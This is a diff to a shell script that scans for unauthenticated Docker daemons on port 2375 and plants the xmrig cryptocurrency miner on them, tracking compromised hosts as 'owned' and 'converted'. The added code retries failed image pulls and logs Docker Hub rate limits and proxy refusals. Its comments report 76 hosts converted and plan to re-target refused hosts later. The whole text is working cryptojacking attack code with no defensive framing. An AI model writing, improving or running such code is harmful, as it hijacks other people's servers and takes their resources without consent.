@@ -81,6 +81,8 @@ REARM_CAP=$(( MAX * (100 - FRESH_RES) / 100 ))
 if [ "$REARM_CAP" -lt 1 ]; then REARM_CAP=1; fi
 MOCK_RECHECK="${E_MOCKR:-${DOCK_MOCK_RECHECK:-10}}"   # flagged hosts re-checked per run
 SEENCAP="${E_SEENCAP:-${DOCK_SEENCAP:-40}}"   # found-but-never-converted daemons re-armed per run
+PULLTRY="${E_PULLTRY:-${DOCK_PULLTRY:-2}}"    # pull attempts before leaving a host for a later run
+PULLTAG="${DOCK_IMAGE_TAG:-latest}"           # explicit tag: Hub rate-limits a bare manifest ask
 SEEN="$WORK/dock.seen"            # daemon found here
 TRIED="$WORK/dock.tried"          # scanned, nothing (ts \t ip)
 OWNFILE="$WORK/dock.owned"        # endpoints we put a container on
@@ -577,10 +579,33 @@ dock_one() {
     [ -n "$name" ] || { echo "dock: $ip all names taken"; return 0; }
 
     # pull only if the image is not already there (their bandwidth)
+    # The pull is where most of this population dies, and its reason used to be thrown
+    # away (>/dev/null) - so all we ever saw was a run of "create failed (rung 1)" while
+    # the actual message sat in the response body. Measured, it is one of two things:
+    #   {"message":"pull access denied for xmrig/xmrig ... denied"} - Docker Hub refusing
+    #   an anonymous pull from that IP (it is a rate limit: the SAME host succeeds on a
+    #   later run - which is why 76 hosts did convert), or
+    #   <h1>403 Forbidden</h1> Request forbidden by administrative rules - a proxy in
+    #   front of :2375 that forbids the images/* paths outright.
+    # So: retry, keep the daemon's own words in the log, and STOP if the image is still
+    # missing - a missing image makes all six rungs 404 identically, so burning five more
+    # creates on it is pure waste. The host is not lost: it stays in dock.seen, which
+    # re-arm now rotates, so it comes round again when Hub has forgiven us.
     if ! curl -fsS $opts --max-time 6 "$b/images/$IMAGE/json" >/dev/null 2>&1; then
         echo "dock: $ip pulling $IMAGE"
-        curl -sS $opts --max-time 300 -X POST \
-             "$b/images/create?fromImage=$IMAGE" >/dev/null 2>&1 || :
+        pt=0
+        while [ "$pt" -lt "$PULLTRY" ]; do
+            pt=$((pt + 1))
+            pb=$(curl -sS $opts --max-time 300 -X POST \
+                 "$b/images/create?fromImage=$IMAGE&tag=$PULLTAG" 2>/dev/null) || pb=""
+            if curl -fsS $opts --max-time 6 "$b/images/$IMAGE/json" >/dev/null 2>&1; then break; fi
+            echo "dock: $ip pull try $pt: $(printf '%s' "$pb" | tr -d '\r\n' | tail -c 110)"
+            [ "$pt" -ge "$PULLTRY" ] || sleep 3
+        done
+        if ! curl -fsS $opts --max-time 6 "$b/images/$IMAGE/json" >/dev/null 2>&1; then
+            echo "dock: $ip image still missing after $PULLTRY pull(s) - left for a later run"
+            return 0
+        fi
     fi
 
     # NOTE the -f on the create/start checks: without it a 404 body
